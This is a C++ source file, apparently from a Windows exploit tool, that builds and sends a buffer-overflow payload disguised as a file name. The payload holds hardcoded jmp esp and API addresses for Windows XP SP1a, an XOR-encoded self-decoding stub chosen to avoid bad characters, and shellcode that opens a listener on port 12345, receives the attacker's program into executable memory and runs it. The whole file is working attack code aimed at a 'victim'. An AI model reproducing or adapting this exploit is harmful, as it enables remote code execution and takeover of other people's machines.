// StubCode.cpp : 定义stub代码的入口点以及将stub代码注入目标所需的函数。
//

#include "Attacker.h"
#include <malloc.h>
#include "StubCode.h"

//win2000 advance server + sp4
//#define ADDRJMPESP			0x77DF4C29
//#define LOADLIBRARYENTRY	((FxLoadLibrary)0x77E705CF)
//#define GETPROCADDRENTRY	((FxGetProcAddr)0x77E6E6A9)
//#define VIRTUALALLOCENTRY	((FxVirtualAlloc)0x77E7175C)

//winxp pro + sp1a
#define ADDRJMPESP			0x77D4643D
#define LOADLIBRARYENTRY	((FxLoadLibrary)0x77E5D961)
#define GETPROCADDRENTRY	((FxGetProcAddr)0x77E5B332)
#define VIRTUALALLOCENTRY	((FxVirtualAlloc)0x77E5AC72)

const BYTE g_arrDisallow[] = {'\0', '\\'};
const char g_szStubTail[] = "\\file.abc";

STUB g_stub =
{
	//arrPadding1
	{'\\', '\\', 'a', 'b', 'c', 'd','a', 'b', 'c', 'd','a', 'b', 'c', 'd','a', 'b', 'c', 'd'},
 
	//dwJmpEsp
	0,

	//arrPadding2
	{0x90, 0x90, 0x90, 0x90},

	//ssc
	{
		{0x33, 0xC9, 0x66, 0xB9},							//arrConst1[4]
		0,													//wXorSize
		{0x8D, 0x74, 0x24},									//arrConst2[3]
		(BYTE)sizeof(STUBSTUBCODE),							//byXorOffset
		{0x56, 0x8A, 0x06, 0x34},							//arrConst3[4]
		0,													//byXorMask
		{0x88,	0x06, 0x46, 0xE2, 0xF7, 0x8D, 0x44, 0x24},	//arrConst4[8]
		(BYTE)(sizeof(STUBSTUBCODE)+sizeof(STUBPARAM)+4),	//byEntryOffset
		{0xFF, 0xD0}										//arrConst5[2]
	},

	//sp
	{
		NULL, NULL, NULL, 0, 0,
		"ws2_32.dll", "socket", "bind",
		"listen", "accept",	"send",	"recv"
	},

	//arrStubCode
	0
};



void WINAPI StubCode(STUBPARAM* psp)
{
	HINSTANCE hWs2_32 = psp->fnLoadLibrary(psp->szWs2_32);
	FxGetProcAddr fnGetProcAddr = psp->fnGetProcAddr;
	Fxsocket fnsocket = (Fxsocket)fnGetProcAddr(hWs2_32, psp->szSocket);
	Fxbind fnbind = (Fxbind)fnGetProcAddr(hWs2_32, psp->szBind);
	Fxlisten fnlisten = (Fxlisten)fnGetProcAddr(hWs2_32, psp->szListen);
	Fxaccept fnaccept = (Fxaccept)fnGetProcAddr(hWs2_32, psp->szAccept);
	Fxsend fnsend = (Fxsend)fnGetProcAddr(hWs2_32, psp->szSend);
	Fxrecv fnrecv = (Fxrecv)fnGetProcAddr(hWs2_32, psp->szRecv);


	BYTE* buf = (BYTE*)psp->fnVirtualAlloc(NULL, psp->dwImageSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	SOCKET sckListen = fnsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	sockaddr_in sa;
	sa.sin_family = AF_INET;
	sa.sin_port = 0x3930;	//htons(12345)
	sa.sin_addr.s_addr = ADDR_ANY;
	fnbind(sckListen, (sockaddr*)&sa, sizeof(sa));

	fnlisten(sckListen, 2);
	SOCKET sckClient = fnaccept(sckListen, NULL, 0);

	fnsend(sckClient, (const char*)(&buf), 4, 0);

	DWORD dwBytesRecv = 0;
	BYTE* pos = buf;
	while(dwBytesRecv < psp->dwImageSize)
	{
		dwBytesRecv += fnrecv(sckClient, (char*)pos, 1024, 0);
		pos = buf + dwBytesRecv;
	}

	FxAttackerEntry fnAttackerEntry = (FxAttackerEntry)(buf + psp->RvaAttackerEntry);
	fnAttackerEntry(buf, psp->fnLoadLibrary, psp->fnGetProcAddr);
}

//this function marks the end of stubcode
void StubCodeEnd()
{
/*
//here is the stubstubcode
	__asm
	{
		xor ecx, ecx
		mov cx, 70 + 241
		lea esi, [esp+26]
		push esi
xormask:
		mov al, [esi]
		xor al, 0xfd
		mov [esi], al
		inc esi
		loop xormask
		lea eax, [esp + (4 + 26 + 70)]
		call eax
	}
*/
}



BYTE GetXorMask(LPCBYTE pData, int nSize, LPCBYTE arrDisallow, int nCount)
{
	int i = 0, j = 0;
	BYTE arrUsage[256], by = 0;
	memset(arrUsage, 0, sizeof(arrUsage));

	for(i=0; i<nSize; i++)
		arrUsage[*(pData + i)] = 1;

	for(i=0; i<256; i++)
	{
		by = (BYTE)i;
		//xor mask can not be a disallowed char
		for(j=0; j<nCount; j++)
			if(arrDisallow[j] == by)
				break;
		if(j < nCount)
			continue;
		//after xor, the data should not contain a disallowed char
		for(j=0; j<nCount; j++)
			if(arrUsage[arrDisallow[j] ^ by] == 1)
				break;
		if(j >= nCount)
			return by;
	}

	//we don't find it, return the first disallowed char for an error
	return arrDisallow[0];
}


BOOL PrepareStub(STUB* pStub)
{
	int nStubCodeSize = (int)(((DWORD)StubCodeEnd) - ((DWORD)StubCode));

	//copy const data
	memcpy(pStub, &g_stub, sizeof(STUB));

	//The Address of jmp esp
	pStub->dwJmpEsp = ADDRJMPESP;

	//prepare stub code param
	pStub->sp.fnLoadLibrary = LOADLIBRARYENTRY;
	pStub->sp.fnGetProcAddr = GETPROCADDRENTRY;
	pStub->sp.fnVirtualAlloc = VIRTUALALLOCENTRY;
	pStub->sp.dwImageSize = GetImageSize((LPCBYTE)g_hInst);
	pStub->sp.RvaAttackerEntry = ((DWORD)AttackerEntry) - ((DWORD)g_hInst);

	//copy stub code
	memcpy(pStub->arrStubCode, StubCode, nStubCodeSize);

	//find xor mask
	int nXorSize = (int)(sizeof(STUBPARAM) + nStubCodeSize);
	LPBYTE pTmp = (LPBYTE)(&(pStub->sp));
	BYTE byXorMask = GetXorMask(pTmp, nXorSize, (LPCBYTE)g_arrDisallow,
		sizeof(g_arrDisallow)/sizeof(g_arrDisallow[0]));
	if(byXorMask == g_arrDisallow[0])
		return FALSE;

	//xor it
	for(int i=0; i<nXorSize; i++)
		*(pTmp+i) ^= byXorMask;

	//fill stubstubcode
	pStub->ssc.wXorSize = (WORD)nXorSize;
	pStub->ssc.byXorMask = byXorMask;

	//Does the stubstubcode contains a disallowed char?
	pTmp = (LPBYTE)(&(pStub->ssc));
	for(i=0; i<sizeof(STUBSTUBCODE); pTmp++, i++)
		for(int j=0; j<sizeof(g_arrDisallow)/sizeof(g_arrDisallow[0]); j++)
			if(*pTmp == g_arrDisallow[j])
				return FALSE;

	//make it an "valid" file name the victim wants
	strcpy((char*)(&(pStub->arrStubCode[nStubCodeSize])), g_szStubTail);

	return TRUE;
}



BOOL InjectStubCode(DWORD dwIpAddr, int nPort)
{
	int nSize = ((int)sizeof(g_stub)) + (((int)StubCodeEnd)-((int)StubCode))
					+ (int)sizeof(g_szStubTail) - 1;
	STUB* pStub = (STUB*)_alloca(nSize);
	if(!PrepareStub(pStub))
		return FALSE;

	SOCKET sck = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(sck == INVALID_SOCKET)
		return FALSE;

	BOOL bOk = FALSE;
	sockaddr_in sa;
	memset(&sa, 0, sizeof(sa));

	sa.sin_family = AF_INET;
	sa.sin_port = 0;
	sa.sin_addr.s_addr = htonl(INADDR_ANY);

	if(bind(sck, (sockaddr *)&sa, sizeof(sa)) == 0)
	{
		sa.sin_family = AF_INET;
		sa.sin_port = htons((u_short)nPort);
		sa.sin_addr.s_addr = htonl((u_long)dwIpAddr);
		if(connect(sck, (sockaddr *)&sa, sizeof(sa)) == 0)
			bOk = (send(sck, (const char*)pStub, nSize, 0) == nSize);
	}

	closesocket(sck);

	return bOk;
}
